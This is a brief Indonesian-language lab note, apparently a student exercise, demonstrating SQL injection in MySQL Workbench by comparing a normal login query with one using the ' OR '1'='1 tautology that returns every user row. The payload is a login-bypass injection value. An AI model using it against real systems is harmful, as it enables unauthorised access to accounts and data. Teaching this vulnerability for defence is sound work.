# Eksperimen SQL Injection

## Deskripsi
Eksperimen ini dilakukan menggunakan MySQL Workbench untuk memahami bagaimana SQL Injection dapat menembus sistem login sederhana.

## Login Normal
Query:
SELECT * FROM users WHERE username = 'admin' AND password = 'admin123';

Hasil:
Menampilkan 1 data (admin)

## SQL Injection
Query:
SELECT * FROM users WHERE username = '' OR '1'='1';

Hasil:
Menampilkan semua data (admin, vera, dosen)

## Kesimpulan
SQL Injection dapat terjadi jika input tidak divalidasi dengan baik.
